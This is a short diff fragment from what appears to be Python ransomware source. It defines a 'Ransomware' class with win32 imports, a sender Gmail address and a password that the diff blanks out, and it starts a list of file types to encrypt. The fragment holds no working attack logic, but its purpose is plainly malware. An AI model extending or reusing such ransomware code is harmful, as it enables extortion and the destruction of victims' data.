@@ -23,7 +23,7 @@ import win32api, win32con, win32gui
 class Ransomware:
 
     sender_email = 'anonymourpythonhacking@gmail.com'
-    sender_password = 'pythonhacking' #not the real pass
+    sender_password = '------' #not the real pass
 
 
     file_types_to_encrypt = [
